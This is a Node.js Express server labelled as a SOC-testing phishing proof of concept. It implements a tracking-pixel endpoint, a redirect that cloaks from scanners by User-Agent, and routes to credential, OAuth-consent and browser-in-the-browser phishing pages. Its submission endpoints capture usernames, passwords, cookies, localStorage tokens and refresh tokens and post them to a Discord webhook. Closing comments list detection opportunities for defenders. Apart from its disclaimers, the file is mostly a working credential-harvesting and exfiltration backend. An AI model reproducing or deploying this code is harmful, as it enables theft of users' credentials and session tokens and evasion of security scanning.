/**
 * WEBHOOK PHISHING HANDLER - SOC TESTING ONLY
 * 
 * This script demonstrates how attackers use webhooks for dynamic content delivery
 * and user-agent based redirection to phishing pages.
 * 
 * WARNING: This is for CONTROLLED SOC TESTING ONLY!
 * DO NOT use against real users or deploy in production environments!
 */

// ===============================================================
// CONFIGURATION SETTINGS - SOC teams can modify these settings
// ===============================================================

// Webhook URL for sending visitor metadata
// Change this to your controlled Discord webhook endpoint
const METADATA_WEBHOOK_URL = "https://discord.com/api/webhooks/CHANNEL_ID/RANDOMID_UNIQUE";

// Target phishing page URL (relative to server root)
const PHISHING_PAGE_URL = "/index.html";

// ===============================================================
// Server setup - Express web server configuration
// ===============================================================

const express = require('express');
const app = express();
const path = require('path');
const fs = require('fs');
const axios = require('axios');
const PORT = 3000;

// ===============================================================
// IMAGE WEBHOOK ENDPOINT - Returns dynamic image and logs access
// ===============================================================

app.get('/webhook/image', (req, res) => {
  const userId = req.query.id || 'unknown';
  const timestamp = new Date().toISOString();
  const ipAddress = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const userAgent = req.headers['user-agent'] || 'unknown';
  const referrer = req.headers.referer || 'direct';

  // Construct metadata payload
  const metadata = {
    trackingId: userId,
    ipAddress: ipAddress,
    userAgent: userAgent,
    timestamp: timestamp,
    referrer: referrer,
    endpoint: '/webhook/image'
  };

  // Format metadata for Discord webhook
  const discordPayload = {
    content: "📢 **Image Webhook Accessed**",
    embeds: [{
      title: "Image Access Detected",
      color: 15258703, // Orange color in decimal
      fields: [
        { name: "Tracking ID", value: userId, inline: true },
        { name: "IP Address", value: ipAddress, inline: true },
        { name: "Timestamp", value: timestamp, inline: false },
        { name: "User Agent", value: userAgent, inline: false },
        { name: "Referrer", value: referrer, inline: true }
      ],
      footer: { text: "Webhook Phishing PoC | SOC Testing Only" }
    }]
  };

  // Send metadata to webhook (async, don't wait for response)
  axios.post(METADATA_WEBHOOK_URL, discordPayload)
    .then(() => console.log('Image access metadata sent to Discord webhook'))
    .catch(err => console.error('Error sending metadata to Discord webhook:', err.message));

  // Return a dynamic image (logo, preview, etc.)
  // Check if the preview.png exists, otherwise return a base64 placeholder
  const imagePath = path.join(__dirname, 'img', 'preview.png');
  
  if (fs.existsSync(imagePath)) {
    res.set('Content-Type', 'image/png');
    res.sendFile(imagePath);
  } else {
    // Generate a base64 placeholder image if the file doesn't exist
    const base64Image = 'iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAYAAAB5fY51AAAACXBIWXMAAAsTAAALEwEAmpwYAAAGAGlUWHRYTUw6Y29tLmFkb2JlLnhtcAAAAAAAPD94cGFja2V0IGJlZ2luPSLvu78iIGlkPSJXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQiPz4gPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iQWRvYmUgWE1QIENvcmUgNS42LWMxNDAgNzkuMTYwNDUxLCAyMDE3LzA1LzA2LTAxOjA4OjIxICAgICAgICAiPiA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPiA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtbG5zOmRjPSJodHRwOi8vcHVybC5vcmcvZGMvZWxlbWVudHMvMS4xLyIgeG1sbnM6cGhvdG9zaG9wPSJodHRwOi8vbnMuYWRvYmUuY29tL3Bob3Rvc2hvcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RFdnQ9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZUV2ZW50IyIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgQ0MgMjAxOCAoTWFjaW50b3NoKSIgeG1wOkNyZWF0ZURhdGU9IjIwMjMtMDQtMTBUMTI6MzA6NDUrMDI6MDAiIHhtcDpNb2RpZnlEYXRlPSIyMDIzLTA0LTEwVDEyOjMxOjE3KzAyOjAwIiB4bXA6TWV0YWRhdGFEYXRlPSIyMDIzLTA0LTEwVDEyOjMxOjE3KzAyOjAwIiBkYzpmb3JtYXQ9ImltYWdlL3BuZyIgcGhvdG9zaG9wOkNvbG9yTW9kZT0iMyIgcGhvdG9zaG9wOklDQ1Byb2ZpbGU9InNSR0IgSUVDNjE5NjYtMi4xIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOjRkZTRkMDM0LTg2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';
    const imgBuffer = Buffer.from(base64Image, 'base64');
    res.set('Content-Type', 'image/png');
    res.send(imgBuffer);
  }
});
// ===============================================================
// REDIRECT WEBHOOK ENDPOINT - Logs metadata and redirects based on logic
// ===============================================================
app.get('/webhook/redirect', (req, res) => {
  // Hook: Token hijack simulation
  const userAgent = req.headers['user-agent'] || 'unknown';
  const userId = req.query.id || 'unknown';
  const timestamp = new Date().toISOString();
  const ipAddress = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const referrer = req.headers.referer || 'direct';
  
  // Extract token and session data from query params if present
  const tokenData = req.query.token || '';
  const sessionData = req.query.session || '';
  
  // Base64 encode sensitive data for logging
  const encodedToken = tokenData ? Buffer.from(tokenData).toString('base64') : '';
  const encodedSession = sessionData ? Buffer.from(sessionData).toString('base64') : '';

  // Construct metadata payload
  const metadata = {
    trackingId: userId,
    ipAddress: ipAddress,
    userAgent: userAgent,
    timestamp: timestamp,
    referrer: referrer,
    endpoint: '/webhook/redirect',
    tokenData: encodedToken,
    sessionData: encodedSession
  };

  // Format metadata for Discord webhook
  const discordPayload = {
    content: "🚨 **Redirect Webhook Accessed**",
    embeds: [{
      title: "Redirect Link Clicked",
      color: 15548997, // Red color in decimal
      fields: [
        { name: "Tracking ID", value: userId, inline: true },
        { name: "IP Address", value: ipAddress, inline: true },
        { name: "Timestamp", value: timestamp, inline: false },
        { name: "User Agent", value: userAgent, inline: false },
        { name: "Referrer", value: referrer, inline: true }
      ],
      footer: { text: "Webhook Phishing PoC | SOC Testing Only" }
    }]
  };
  
  // Add token data fields if present
  if (encodedToken) {
    discordPayload.embeds[0].fields.push({
      name: "Token Data (Base64)",
      value: encodedToken,
      inline: false
    });
  }
  
  // Add session data fields if present
  if (encodedSession) {
    discordPayload.embeds[0].fields.push({
      name: "Session Data (Base64)",
      value: encodedSession,
      inline: false
    });
  }

  // Send metadata to webhook (async, don't wait for response)
  axios.post(METADATA_WEBHOOK_URL, discordPayload)
    .then(() => console.log('Redirect metadata sent to Discord webhook'))
    .catch(err => console.error('Error sending metadata to Discord webhook:', err.message));

  // Redirect logic (dynamic)
  if (userAgent.includes('curl') || 
      userAgent.includes('python') || 
      userAgent.includes('scanner') || 
      userAgent.includes('wget')) {
    console.log(`[CLOAKING] Detected scanner/tool in User-Agent: ${userAgent}`);
    return res.redirect('https://microsoft.com'); // Cloak from scanners
  }

  // Determine redirect target
  // If consent parameter is present, redirect to consent phishing page
  if (req.query.consent === 'true') {
    return res.redirect(`http://localhost:8080/consent.html?id=${userId}`);
  }
  
  // If bitb parameter is present, redirect to Browser-in-the-Browser page
  if (req.query.bitb === 'true') {
    return res.redirect(`http://localhost:8080/bitb.html?id=${userId}`);
  }
  
  // Real phishing simulation redirect with token parameters
  return res.redirect(`http://localhost:8080/index.html?id=${userId}&token=${tokenData}&session=${sessionData}`);
});

// ===============================================================
// CREDENTIAL SUBMISSION ENDPOINT - Receives and logs captured credentials
// ===============================================================

app.use(express.json()); // Add middleware to parse JSON bodies

app.post('/api/submit', (req, res) => {
  const requestData = req.body;
  const timestamp = new Date().toISOString();
  const ipAddress = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const userAgent = req.headers['user-agent'] || 'unknown';
  
  // Check if the data is base64 encoded
  let credentials = requestData;
  let tokenData = null;
  
  if (requestData.encodedData) {
    try {
      // Decode the base64 encoded payload
      const decodedData = JSON.parse(Buffer.from(requestData.encodedData, 'base64').toString());
      credentials = decodedData;
      
      // Extract token data if available
      if (decodedData.tokenData) {
        tokenData = decodedData.tokenData;
      }
    } catch (error) {
      console.error('Error decoding base64 data:', error);
    }
  }
  
  // Format credentials for Discord webhook
  const discordPayload = {
    content: "🔐 **Credentials Captured**",
    embeds: [{
      title: "Login Credentials Submitted",
      color: 15158332, // Purple color in decimal
      fields: [
        { name: "Username", value: credentials.username || 'unknown', inline: true },
        { name: "Password", value: credentials.password || 'unknown', inline: true },
        { name: "Tracking ID", value: credentials.trackingId || requestData.trackingId || 'unknown', inline: true },
        { name: "IP Address", value: ipAddress, inline: true },
        { name: "Timestamp", value: timestamp, inline: false },
        { name: "User Agent", value: userAgent, inline: false }
      ],
      footer: { text: "Webhook Phishing PoC | SOC Testing Only" }
    }]
  };
  
  // Add token data fields if present
  if (tokenData) {
    discordPayload.embeds[0].fields.push({
      name: "URL Token",
      value: tokenData.urlToken || 'none',
      inline: true
    });
    
    discordPayload.embeds[0].fields.push({
      name: "URL Session",
      value: tokenData.urlSession || 'none',
      inline: true
    });
    
    discordPayload.embeds[0].fields.push({
      name: "LocalStorage Token",
      value: tokenData.localStorageToken || 'none',
      inline: false
    });
    
    discordPayload.embeds[0].fields.push({
      name: "Cookie Data",
      value: tokenData.cookieData || 'none',
      inline: false
    });
  }
  
  // Send credentials to webhook (async, don't wait for response)
  axios.post(METADATA_WEBHOOK_URL, discordPayload)
    .then(() => console.log('Credentials sent to Discord webhook'))
    .catch(err => console.error('Error sending credentials to Discord webhook:', err.message));
  
  // Add CORS headers to allow cross-origin requests
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type');
  
  // Return success response
  res.json({ success: true });
});

// Add OPTIONS handler for CORS preflight requests
app.options('/api/submit', (req, res) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type');
  res.sendStatus(200);
});

// ===============================================================
// CONSENT PHISHING ENDPOINT - Receives and logs OAuth consent grants
// ===============================================================

app.post('/api/consent', (req, res) => {
  // Hook: Consent phishing simulation
  const consentData = req.body;
  const timestamp = new Date().toISOString();
  const ipAddress = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const userAgent = req.headers['user-agent'] || 'unknown';
  
  // Format consent data for Discord webhook
  const discordPayload = {
    content: "🔑 **OAuth Consent Granted**",
    embeds: [{
      title: "Application Authorization Granted",
      color: 3066993, // Green color in decimal
      fields: [
        { name: "Username", value: consentData.username || 'unknown', inline: true },
        { name: "Consent Granted", value: consentData.consentGranted ? "Yes" : "No", inline: true },
        { name: "Tracking ID", value: consentData.trackingId || 'unknown', inline: true },
        { name: "IP Address", value: ipAddress, inline: true },
        { name: "Timestamp", value: timestamp, inline: false },
        { name: "User Agent", value: userAgent, inline: false },
        { name: "Scopes Granted", value: consentData.scopes ? consentData.scopes.join(", ") : 'none', inline: false },
        { name: "Refresh Token", value: consentData.fakeRefreshToken || 'none', inline: false }
      ],
      footer: { text: "Webhook Phishing PoC | SOC Testing Only" }
    }]
  };
  
  // Send consent data to webhook (async, don't wait for response)
  axios.post(METADATA_WEBHOOK_URL, discordPayload)
    .then(() => console.log('Consent data sent to Discord webhook'))
    .catch(err => console.error('Error sending consent data to Discord webhook:', err.message));
  
  // Add CORS headers to allow cross-origin requests
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type');
  
  // Return success response
  res.json({ success: true });
});

// Add OPTIONS handler for CORS preflight requests for consent endpoint
app.options('/api/consent', (req, res) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type');
  res.sendStatus(200);
});

// ===============================================================
// Server startup
// ===============================================================

app.listen(PORT, () => {
  console.log(`
  WARNING: SECURITY TESTING ENVIRONMENT ACTIVE
  
  Webhook server running on http://localhost:${PORT}
  
  This server is configured to:
  1. Serve dynamic images at /webhook/image
  2. Log visitor information
  3. Send metadata to webhook: ${METADATA_WEBHOOK_URL}
  4. Redirect visitors based on User-Agent
  5. Redirect to phishing page: ${PHISHING_PAGE_URL}
  
  FOR SOC TESTING PURPOSES ONLY - DO NOT USE IN PRODUCTION
  `);

  // Create img directory if it doesn't exist
  const imgDir = path.join(__dirname, 'img');
  if (!fs.existsSync(imgDir)) {
    fs.mkdirSync(imgDir);
    console.log(`Created directory: ${imgDir}`);
  }
});

// ===============================================================
// SOC TESTING NOTES
// ===============================================================
// 1. This simulation demonstrates how attackers use webhooks for dynamic content
// 2. The image webhook allows tracking of email opens without user interaction
// 3. The redirect webhook enables user-agent based cloaking and redirection
// 4. Metadata exfiltration occurs via HTTP POST to a configurable webhook URL
//
// DETECTION OPPORTUNITIES:
// - Monitor for suspicious image requests to non-corporate domains
// - Look for outbound POST requests to webhook services from internal systems
// - Analyze redirects that vary behavior based on user-agent
// - Detect base64 encoded content in HTTP responses
//
// NEVER deploy this in production environments or against real users!
// This is for CONTROLLED SOC TESTING ONLY!
// ===============================================================